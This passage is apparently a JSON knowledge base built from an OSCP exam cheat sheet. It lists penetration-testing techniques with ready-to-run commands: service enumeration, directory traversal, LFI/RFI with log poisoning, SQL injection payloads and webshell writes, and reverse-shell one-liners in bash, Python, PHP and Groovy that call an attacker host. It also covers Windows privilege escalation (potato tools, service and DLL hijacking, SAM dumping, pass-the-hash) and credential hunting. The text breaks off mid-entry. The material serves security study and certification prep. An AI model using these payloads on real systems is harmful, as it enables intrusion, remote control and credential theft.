    "code_snippets": [
      {"language": "bash", "command": "nc -nv <target_ip> 25"},
      {"language": "bash", "command": "smtp-user-enum -M VRFY -U username.txt -t <target_ip>"},
      {"language": "bash", "command": "sudo swaks -t user1@domain.com --from sender@domain.com --attach @file.xxx --server <target_ip> --body @body.txt --header \"Subject: Subject\" -ap"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ldap_enumeration",
    "category": "Enumeration",
    "title": "LDAP Enumeration (ldapsearch, windapsearch)",
    "content": "Use `ldapsearch` for querying LDAP/LDAPS. Start with anonymous bind (`-x`). If credentials are known, use `-D` and `-w`. Specify the base DN (`-b`) and use filters to query specific objects (Users, Computers, Groups like Domain Admins, Builtin Administrators, Remote Desktop Users). Alternatively, use `windapsearch.py` for targeted enumeration.",
    "tags": ["enumeration", "ldap", "ldaps", "active directory", "ldapsearch", "windapsearch.py", "anonymous bind", "users", "groups", "computers"],
    "code_snippets": [
      {"language": "bash", "command": "ldapsearch -x -H ldap://<target_ip>:<port>"},
      {"language": "bash", "command": "ldapsearch -x -H ldap://<target_ip> -D '<DOMAIN>\\<username>' -w '<password>' -b \"DC=<domain>,DC=<tld>\""},
      {"language": "bash", "command": "ldapsearch -x -H ldap://<target_ip> -D '<DOMAIN>\\<username>' -w '<password>' -b \"CN=Domain Admins,CN=Users,DC=<domain>,DC=<tld>\""},
      {"language": "bash", "command": "python3 windapsearch.py --dc-ip <target_ip> -u <user> -p <pass> --computers"},
      {"language": "bash", "command": "python3 windapsearch.py --dc-ip <target_ip> -u <user> -p <pass> --privileged-users"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "nfs_enumeration",
    "category": "Enumeration",
    "title": "NFS Enumeration",
    "content": "Use Nmap script `nfs-showmount` or the `showmount -e <IP>` command to list NFS shares exported by a server.",
    "tags": ["enumeration", "nfs", "nmap", "nse", "showmount"],
    "code_snippets": [
      {"language": "bash", "command": "nmap -sV --script=nfs-showmount <target_ip>"},
      {"language": "bash", "command": "showmount -e <target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "snmp_enumeration",
    "category": "Enumeration",
    "title": "SNMP Enumeration",
    "content": "Perform Nmap UDP scan (`-sU`) for SNMP (port 161). Use `snmpcheck` or `snmpwalk` with community string (e.g., `public`) to query the MIB tree. Specific OIDs can reveal Windows user accounts, running processes, installed software, and open TCP ports.",
    "tags": ["enumeration", "snmp", "udp", "nmap", "snmpcheck", "snmpwalk", "mib", "oid", "windows"],
    "code_snippets": [
      {"language": "bash", "command": "sudo nmap <target_ip> -A -T4 -p 161 -sU -v"},
      {"language": "bash", "command": "snmpcheck -t <target_ip> -c public"},
      {"language": "bash", "command": "snmpwalk -c public -v1 <target_ip>"},
      {"language": "bash", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.4.1.77.1.2.25"},
      {"language": "bash", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.25.4.2.1.2"},
      {"language": "bash", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.6.13.1.3"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "snmp_windows_mibs",
    "category": "Enumeration",
    "title": "SNMP: Common Windows MIB Values (OIDs)",
    "content": "List of common OIDs for querying Windows information via SNMP, including System Processes, Running Programs, Processes Path, Storage Units, Software Name, User Accounts, and TCP Local Ports.",
    "tags": ["enumeration", "snmp", "windows", "mib", "oid"],
    "code_snippets": [
      {"language": "text", "command": "1.3.6.1.2.1.25.1.6.0 : System Processes"},
      {"language": "text", "command": "1.3.6.1.2.1.25.4.2.1.2 : Running Programs"},
      {"language": "text", "command": "1.3.6.1.4.1.77.1.2.25 : User Accounts"},
      {"language": "text", "command": "1.3.6.1.2.1.6.13.1.3 : TCP Local Ports"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "rpc_enumeration",
    "category": "Enumeration",
    "title": "RPC Enumeration (rpcclient)",
    "content": "Use `rpcclient` to connect to RPC endpoints (port 135/445). Try anonymous login (`-U \"\"`). Useful commands within `rpcclient`: `srvinfo`, `enumdomusers`, `enumprivs`, `queryuser`, `lookupnames`, `enumdomains`, `enumdomgroups`, `querygroup`, `netshareenumall`, `lsaenumsid`.",
    "tags": ["enumeration", "rpc", "rpcclient", "windows", "active directory", "user enumeration", "share enumeration", "sid"],
    "code_snippets": [
      {"language": "bash", "command": "rpcclient -U=\"\" <target_ip>"},
      {"language": "bash", "command": "rpcclient -U=user <target_ip>"},
      {"language": "text", "command": "rpc> srvinfo"},
      {"language": "text", "command": "rpc> enumdomusers"},
      {"language": "text", "command": "rpc> netshareenumall"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "web_attack_directory_traversal",
    "category": "Web Attack",
    "title": "Web Attack: Directory Traversal",
    "content": "Exploit directory traversal vulnerabilities by using `../` sequences in parameters (e.g., `?page=../../etc/passwd`). Use `curl` to view raw output. Try URL encoding (`%2e%2e/`) if simple traversal fails. Look for sensitive files like `/etc/passwd`, SSH keys (`id_rsa`), or Windows paths (`../../Users/install.txt`).",
    "tags": ["web attack", "directory traversal", "path traversal", "lfi", "curl", "url encoding"],
    "code_snippets": [
      {"language": "bash", "command": "curl http://<target_ip>/path?page=../../../../etc/passwd"},
      {"language": "bash", "command": "curl http://<target_ip>/cgi-bin/%2e%2e/%2e%2e/etc/passwd"},
      {"language": "bash", "command": "curl http://<target_ip>:3000/path/../../../../Users/install.txt"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "web_attack_lfi_rfi",
    "category": "Web Attack",
    "title": "Web Attack: LFI / RFI",
    "content": "Local File Inclusion (LFI) allows including local files, potentially leading to RCE via log poisoning or PHP wrappers. Remote File Inclusion (RFI) allows including remote files (e.g., PHP shells hosted on attacker machine). Log poisoning involves injecting code (e.g., PHP `system()`) into server logs (like Apache access logs) and then including the log file via LFI. PHP wrappers (`php://filter`, `data://`) can be used to read source code or execute code if `allow_url_include` is on.",
    "tags": ["web attack", "lfi", "rfi", "log poisoning", "php wrappers", "rce", "webshell", "php filter", "data wrapper"],
    "code_snippets": [
      {"language": "bash", "command": "# Log Poisoning RCE"},
      {"language": "bash", "command": "curl http://<target_ip>/ -A '<?php system($_GET[\"cmd\"]); ?>'"},
      {"language": "bash", "command": "curl 'http://<target_ip>/index.php?page=../../log/apache2/access.log&cmd=whoami'"},
      {"language": "bash", "command": "# PHP Wrapper - Read Source"},
      {"language": "bash", "command": "curl http://<target_ip>/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/config.php"},
      {"language": "bash", "command": "# PHP Wrapper - Execute Code"},
      {"language": "bash", "command": "curl \"http://<target_ip>/index.php?page=data://text/plain,<?php echo system('id');?>\""},
      {"language": "bash", "command": "# RFI"},
      {"language": "bash", "command": "python3 -m http.server 80"},
      {"language": "bash", "command": "curl http://<target_ip>/index.php?page=http://<kali_ip>/shell.php&cmd=ls"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "web_attack_sqli_bypass",
    "category": "Web Attack",
    "title": "Web Attack: SQL Injection Bypasses",
    "content": "Common simple payloads to bypass authentication or test for SQL injection, using `OR 1=1` with different comment styles (`--`, `/*`, `#`).",
    "tags": ["web attack", "sqli", "sql injection", "authentication bypass", "payload"],
    "code_snippets": [
      {"language": "sql", "command": "' or '1'='1"},
      {"language": "sql", "command": "\" or 1=1--"},
      {"language": "sql", "command": "') or \"1\"=\"1\"#"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "web_attack_sqli_blind",
    "category": "Web Attack",
    "title": "Web Attack: Blind SQL Injection (Time-based)",
    "content": "Identify blind SQL injection by injecting time delays (e.g., `sleep(3)` in MySQL/MariaDB) conditioned on a boolean statement.",
    "tags": ["web attack", "sqli", "sql injection", "blind sqli", "time-based sqli", "sleep"],
    "code_snippets": [
      {"language": "sql", "command": "' AND IF(1=1, sleep(3), 'false') -- //"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "web_attack_sqli_rce_manual",
    "category": "Web Attack",
    "title": "Web Attack: SQL Injection Manual RCE",
    "content": "Techniques for achieving RCE through SQL injection. On MS-SQL, use `impacket-mssqlclient` to enable and use `xp_cmdshell`. On MySQL/MariaDB, use `UNION SELECT ... INTO OUTFILE` to write a webshell to a web-accessible directory.",
    "tags": ["web attack", "sqli", "sql injection", "rce", "mssql", "xp_cmdshell", "impacket-mssqlclient", "mysql", "into outfile", "webshell"],
    "code_snippets": [
      {"language": "bash", "command": "impacket-mssqlclient <creds>@<target_ip> -windows-auth"},
      {"language": "sql", "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"},
      {"language": "sql", "command": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"},
      {"language": "sql", "command": "EXEC xp_cmdshell 'whoami';"},
      {"language": "sql", "command": "' UNION SELECT \"<?php system($_GET['cmd']);?>\", null INTO OUTFILE \"/var/www/html/shell.php\" -- //"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "web_attack_sqli_sqlmap",
    "category": "Web Attack",
    "title": "Web Attack: SQL Injection (sqlmap)",
    "content": "Automate SQL injection detection and exploitation with `sqlmap`. Use `-u` for URL and `-p` to specify the parameter. Use `--dump` to extract data. Use `-r` to load a request from a file (e.g., captured with Burp). Use `--os-shell` to attempt getting a shell, optionally specifying `--web-root` if needed.",
    "tags": ["web attack", "sqli", "sql injection", "sqlmap", "automation", "dump", "os-shell"],
    "code_snippets": [
      {"language": "bash", "command": "sqlmap -u http://<target_ip>/vuln.php?user=1 -p user"},
      {"language": "bash", "command": "sqlmap -u http://<target_ip>/vuln.php?user=1 -p user --dump"},
      {"language": "bash", "command": "sqlmap -r request.txt -p item --os-shell --web-root \"/var/www/html/tmp\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "exploitation_finding_exploits_searchsploit",
    "category": "Exploitation",
    "title": "Finding Exploits (Searchsploit)",
    "content": "Use `searchsploit <name>` to search the local Exploit-DB archive for exploits related to a specific software or version. Use `searchsploit -m <id>` to copy an exploit script to the current directory.",
    "tags": ["exploitation", "exploit search", "searchsploit", "exploit-db"],
    "code_snippets": [
      {"language": "bash", "command": "searchsploit <name>"},
      {"language": "bash", "command": "searchsploit -m windows/remote/46697.py"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "exploitation_reverse_shells_msfvenom",
    "category": "Exploitation",
    "title": "Reverse Shells (Msfvenom)",
    "content": "Generate reverse shell payloads in various formats using `msfvenom`. Specify payload (`-p`), LHOST, LPORT, and output format (`-f`). Examples provided for Windows (.exe), ASP, JSP, WAR, and PHP.",
    "tags": ["exploitation", "reverse shell", "payload generation", "msfvenom", "windows", "linux", "web", "exe", "asp", "jsp", "war", "php"],
    "code_snippets": [
      {"language": "bash", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=<PORT> -f exe > shell-x64.exe"},
      {"language": "bash", "command": "msfvenom -p windows/shell/reverse_tcp LHOST=<kali_ip> LPORT=<PORT> -f asp > shell.asp"},
      {"language": "bash", "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<kali_ip> LPORT=<PORT> -f raw > shell.jsp"},
      {"language": "bash", "command": "msfvenom -p php/reverse_php LHOST=<kali_ip> LPORT=<PORT> -f raw > shell.php"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "exploitation_reverse_shells_oneliners",
    "category": "Exploitation",
    "title": "Reverse Shells (One-Liners)",
    "content": "Common one-line commands to establish reverse shells using bash, python, and php.",
    "tags": ["exploitation", "reverse shell", "payload", "one-liner", "bash", "python", "php"],
    "code_snippets": [
      {"language": "bash", "command": "bash -i >& /dev/tcp/<kali_ip>/<PORT> 0>&1"},
      {"language": "python", "command": "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<kali_ip>',<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"},
      {"language": "php", "command": "<?php echo shell_exec('bash -i >& /dev/tcp/<kali_ip>/<PORT> 0>&1');?>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "exploitation_reverse_shell_groovy_jenkins",
    "category": "Exploitation",
    "title": "Reverse Shell (Groovy for Jenkins)",
    "content": "A Groovy script payload designed to establish a reverse shell, often used in Jenkins environments.",
    "tags": ["exploitation", "reverse shell", "payload", "groovy", "jenkins"],
    "code_snippets": [
      {"language": "groovy", "command": "String host=\"<kali_ip>\";int port=<PORT>;String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_manual_enum_cmds",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Manual Enumeration Commands",
    "content": "Commands for gathering basic user, group, system, and process information on Windows: `whoami /groups`, `whoami /all`, service control (`Start/Stop/Restart-Service`), PowerShell history (`Get-History`, `(Get-PSReadlineOption).HistorySavePath`), listing installed programs (`Get-ItemProperty ...\\Uninstall\\*`), process info (`Get-Process`).",
    "tags": ["windows", "privesc", "enumeration", "manual enum", "whoami", "powershell", "service", "get-process", "get-itemproperty"],
    "code_snippets": [
      {"language": "powershell", "command": "whoami /groups"},
      {"language": "powershell", "command": "Start-Service <service>"},
      {"language": "powershell", "command": "Get-History"},
      {"language": "powershell", "command": "(Get-PSReadlineOption).HistorySavePath"},
      {"language": "powershell", "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\...\\Uninstall\\*\" | select displayname"},
      {"language": "powershell", "command": "Get-Process | Select ProcessName, Path"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_automated_scripts",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Automated Scripts",
    "content": "Commonly used automated enumeration and privilege escalation checking scripts for Windows: `winpeas.exe/.bat`, `Jaws-enum.ps1`, `powerup.ps1`, `PrivescCheck.ps1`.",
    "tags": ["windows", "privesc", "enumeration", "automated enum", "winpeas", "jaws-enum", "powerup", "privesccheck"],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_token_impersonation",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Token Impersonation (Potato Attacks)",
    "content": "Exploit `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (check with `whoami /priv`). Tools include PrintSpoofer, RoguePotato, GodPotato, JuicyPotatoNG, SharpEfsPotato. These tools typically allow executing commands or a reverse shell as SYSTEM.",
    "tags": ["windows", "privesc", "token impersonation", "potato attack", "seimpersonateprivilege", "printspoofer", "roguepotato", "godpotato", "juicypotatong", "sharpefspotato"],
    "code_snippets": [
      {"language": "powershell", "command": "whoami /priv"},
      {"language": "bash", "command": "PrintSpoofer.exe -i -c powershell.exe"},
      {"language": "bash", "command": "RoguePotato.exe -r <kali_ip> -e \"shell.exe\" -l 9999"},
      {"language": "bash", "command": "GodPotato.exe -cmd \"shell.exe\""},
      {"language": "bash", "command": "JuicyPotatoNG.exe -t * -p \"shell.exe\" -a"},
      {"language": "bash", "command": "SharpEfsPotato.exe -p C:\\path\\to\\powershell.exe -a \"<command>\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_service_binary_hijack",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Service Binary Hijacking",
    "content": "Identify services (using WinPEAS or manual checks). Check permissions on the service binary path (`icacls \"path\"`). If write permissions exist (`(F)` for Full control), find the binary path (`sc qc <servicename>`). Optionally, change the path (`sc config <service> binPath=`) or replace the binary with a reverse shell. Start the service (`sc start <servicename>`) to trigger.",
    "tags": ["windows", "privesc", "service exploitation", "binary hijacking", "insecure permissions", "icacls", "sc qc", "sc config", "sc start"],
    "code_snippets": [
      {"language": "bash", "command": "icacls \"path\""},
      {"language": "bash", "command": "sc qc <servicename>"},
      {"language": "bash", "command": "sc config <service> binPath= \"C:\\path\\to\\shell.exe\""},
      {"language": "bash", "command": "sc start <servicename>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_unquoted_service_path",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Unquoted Service Path",
    "content": "Find services with unquoted paths using `wmic` or WinPEAS. Check for write permissions (`icacls`) in directories along the path. Place a payload named appropriately in a writable location early in the path. Start the service (`sc start`).",
    "tags": ["windows", "privesc", "service exploitation", "unquoted service path", "insecure permissions", "wmic", "icacls", "sc start"],
    "code_snippets": [
      {"language": "bash", "command": "wmic service get name, pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\""},
      {"language": "bash", "command": "icacls \"path\""},
      {"language": "bash", "command": "sc start <servicename>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_insecure_service_executables",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Insecure Service Executables",
    "content": "Identify services where the executable file itself has weak permissions (e.g., `Everyone [AllAccess]`). Replace the executable with a payload and start the service.",
    "tags": ["windows", "privesc", "service exploitation", "insecure permissions", "binary hijacking"],
    "code_snippets": [
      {"language": "bash", "command": "sc start <service>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_weak_registry_permissions",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Weak Registry Permissions",
    "content": "Look for service registry keys with weak permissions (`HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service>`) allowing modification (`KEY_ALL_ACCESS`). Use `accesschk` to verify. Use `reg query` to find the `ImagePath` value. Use `reg add` to modify `ImagePath` to point to a payload. Start the service (`net start`).",
    "tags": ["windows", "privesc", "service exploitation", "registry permissions", "insecure permissions", "accesschk", "reg query", "reg add", "net start"],
    "code_snippets": [
      {"language": "bash", "command": "accesschk /accepteula -uvwqk <registry_path>"},
      {"language": "bash", "command": "reg query <registry_path>"},
      {"language": "bash", "command": "reg add HKLM\\SYSTEM\\...\\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f"},
      {"language": "bash", "command": "net start <service>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_dll_hijacking",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: DLL Hijacking",
    "content": "Use Process Monitor (ProcMon) to find DLLs that a privileged service attempts to load from potentially writable locations. Check write permissions for the directory. Create a malicious DLL payload using `msfvenom` (`-f dll`), naming it after the missing/hijackable DLL. Place the malicious DLL in the writable directory. Restart the service.",
    "tags": ["windows", "privesc", "dll hijacking", "insecure permissions", "process monitor", "procmon", "msfvenom"],
    "code_snippets": [
      {"language": "bash", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=<port> -f dll > filename.dll"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_autorun",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Autorun Abuse",
    "content": "Check Autorun registry keys (`HKCU\\...\\Run`, `HKLM\\...\\Run`) for applications that run at login. Check if the location of any listed executable is writable (`accesschk`). Replace the executable with a payload. Wait for an admin to log in.",
    "tags": ["windows", "privesc", "autorun", "registry", "insecure permissions", "persistence"],
    "code_snippets": [
      {"language": "bash", "command": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
      {"language": "bash", "command": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
      {"language": "bash", "command": "accesschk.exe /accepteula -wvu \"<path>\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_alwaysinstallelevated",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: AlwaysInstallElevated",
    "content": "Check registry keys (`HKCU\\...\\Installer\\AlwaysInstallElevated`, `HKLM\\...\\Installer\\AlwaysInstallElevated`). If both are set to 1, any user can install MSI packages with SYSTEM privileges. Create an MSI reverse shell payload using `msfvenom` (`-f msi`). Execute it on the target using `msiexec /quiet /qn /i <payload.msi>`.",
    "tags": ["windows", "privesc", "alwaysinstallelevated", "registry", "msi", "msfvenom", "msiexec"],
    "code_snippets": [
      {"language": "bash", "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},
      {"language": "bash", "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},
      {"language": "bash", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=<port> --platform windows -f msi > reverse.msi"},
      {"language": "bash", "command": "msiexec /quiet /qn /i reverse.msi"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_scheduled_tasks",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Scheduled Tasks Abuse",
    "content": "List scheduled tasks using `schtasks /query /fo LIST /v`. Identify tasks running with higher privileges where the executable path is writable (`icacls \"path\"`). Replace the executable with a payload and wait for the task to run.",
    "tags": ["windows", "privesc", "scheduled tasks", "schtasks", "insecure permissions"],
    "code_snippets": [
      {"language": "bash", "command": "schtasks /query /fo LIST /v"},
      {"language": "bash", "command": "icacls \"path\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_startup_apps",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Startup Apps Abuse",
    "content": "Check the Startup folder (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`). If it's writable, place a payload there. The payload will execute the next time any user logs in.",
    "tags": ["windows", "privesc", "startup folder", "persistence", "insecure permissions"],
    "code_snippets": [
      {"language": "text", "command": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_insecure_gui_apps",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Insecure GUI Apps",
    "content": "Identify GUI applications running as a privileged user (Task Manager). If the application has an 'Open' or 'Browse' feature, try entering `file://c:/windows/system32/cmd.exe` to potentially launch a privileged command prompt.",
    "tags": ["windows", "privesc", "gui application", "file open dialog"],
    "code_snippets": [
      {"language": "text", "command": "file://c:/windows/system32/cmd.exe"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_sam_system_dump",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Offline SAM/SYSTEM Dump",
    "content": "Look for backups or accessible copies of SAM and SYSTEM registry hives in locations like `repair`, `RegBack`, or `windows.old`. Use `dir /s` to search. If found, copy them and use `impacket-secretsdump -system SYSTEM -sam SAM local` on Kali to extract NTLM hashes.",
    "tags": ["windows", "privesc", "credential dumping", "hash dumping", "sam", "system", "registry hive", "offline attack", "impacket-secretsdump"],
    "code_snippets": [
      {"language": "bash", "command": "dir /s SAM"},
      {"language": "bash", "command": "dir /s SYSTEM"},
      {"language": "bash", "command": "impacket-secretsdump -system SYSTEM -sam SAM local"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_password_hunting_files",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Password Hunting (Files)",
    "content": "Search for plaintext passwords in common file types using `findstr`. Look for keywords like 'password' or 'pass'/'pwd' in `.txt`, `.xml`, `.ini`, `.config` files. Also search for specific filenames like `unattend.xml`, `web.config`, `sysprep.inf`, `sysprep.xml`, or VNC config files (`*vnc.ini`).",
    "tags": ["windows", "privesc", "credential hunting", "plaintext passwords", "findstr", "unattend.xml", "web.config", "vnc"],
    "code_snippets": [
      {"language": "bash", "command": "findstr /si password *.txt"},
      {"language": "bash", "command": "findstr /si password *.xml"},
      {"language": "bash", "command": "findstr /si password *.ini"},
      {"language": "bash", "command": "findstr /spin \"password\" *.*"},
      {"language": "bash", "command": "dir /b /s unattend.xml"},
      {"language": "bash", "command": "dir c:\\*vnc.ini /s /b"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_password_hunting_registry",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Password Hunting (Registry)",
    "content": "Search the registry (HKLM and HKCU) for keys containing 'password' using `reg query`. Check specific locations like Winlogon for autologin credentials, PuTTY sessions for saved credentials/keys, VNC configuration, and SNMP parameters.",
    "tags": ["windows", "privesc", "credential hunting", "plaintext passwords", "registry", "reg query", "winlogon", "putty", "vnc", "snmp"],
    "code_snippets": [
      {"language": "bash", "command": "reg query HKLM /f password /t REG_SZ /s"},
      {"language": "bash", "command": "reg query HKCU /f password /t REG_SZ /s"},
      {"language": "bash", "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\""},
      {"language": "bash", "command": "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\""},
      {"language": "bash", "command": "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_runas_savedcreds",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: RunAs with Saved Credentials",
    "content": "Check for credentials saved by `runas /savecred` using `cmdkey /list`. If credentials for a privileged user are found, use `runas /savecred /user:<user> <command>` to execute commands (like a reverse shell) as that user without needing the password again.",
    "tags": ["windows", "privesc", "runas", "savecred", "cmdkey", "credential hunting"],
    "code_snippets": [
      {"language": "bash", "command": "cmdkey /list"},
      {"language": "bash", "command": "runas /savecred /user:admin C:\\Temp\\reverse.exe"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "winprivesc_pass_the_hash_pth_winexe",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Pass the Hash (pth-winexe)",
    "content": "Use `pth-winexe` tool (often used on Kali) to execute commands on a remote Windows host using NTLM hashes instead of a password.",
    "tags": ["windows", "privesc", "pass the hash", "pth", "lateral movement", "pth-winexe", "ntlm hash"],
    "code_snippets": [
      {"language": "bash", "command": "pth-winexe -U <DOMAIN>/<user>%<LMhash>:<NThash> //<target_ip> cmd.exe"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linuxprivesc_tty_shell_stabilization",
    "category": "Linux Privilege Escalation",
    "title": "Linux: TTY Shell Stabilization",
    "content": "Commands to upgrade a basic reverse shell to a more interactive TTY shell using Python, sh, bash, or Perl.",
    "tags": ["linux", "shell", "reverse shell", "tty", "pty", "stabilization", "python"],
    "code_snippets": [
      {"language": "bash", "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"},
      {"language": "bash", "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
      {"language": "bash", "command": "/bin/sh -i"},
      {"language": "bash", "command": "perl -e 'exec \"/bin/sh\";'"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linuxprivesc_basic_enum_cmds",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc: Basic Enumeration Commands",
    "content": "Common commands for initial enumeration after gaining shell access: find writable directories (`find / -writable`), list installed packages (`dpkg -l`), check mounted filesystems (`cat /etc/fstab`, `lsblk`), view loaded kernel modules (`lsmod`), watch processes for passwords (`watch ps`), sniff loopback traffic (`tcpdump -i lo`).",
    "tags": ["linux", "privesc", "enumeration", "manual enum", "find", "dpkg", "fstab", "lsblk", "lsmod", "ps", "tcpdump"],
    "code_snippets": [
      {"language": "bash", "command": "find / -writable -type d 2>/dev/null"},
      {"language": "bash", "command": "dpkg -l"},
      {"language": "bash", "command": "cat /etc/fstab"},
      {"language": "bash", "command": "lsblk"},
      {"language": "bash", "command": "lsmod"},
      {"language": "bash", "command": "watch -n 1 \"ps -aux | grep pass\""},
      {"language": "bash", "command": "sudo tcpdump -i lo -A | grep \"pass\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linuxprivesc_automated_scripts",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc: Automated Scripts",
